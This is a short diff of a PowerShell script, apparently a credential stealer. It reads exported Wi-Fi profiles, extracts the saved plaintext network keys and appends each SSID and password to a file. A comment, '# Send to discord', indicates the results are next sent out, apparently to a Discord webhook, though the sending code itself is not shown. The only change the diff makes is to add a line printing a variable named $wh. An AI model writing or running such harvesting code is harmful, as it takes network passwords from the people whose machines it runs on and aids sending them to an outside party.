@@ -41,7 +41,7 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
     $pass = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
     "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
 }
-
+Write-Output $wh
 
 
 # Send to discord
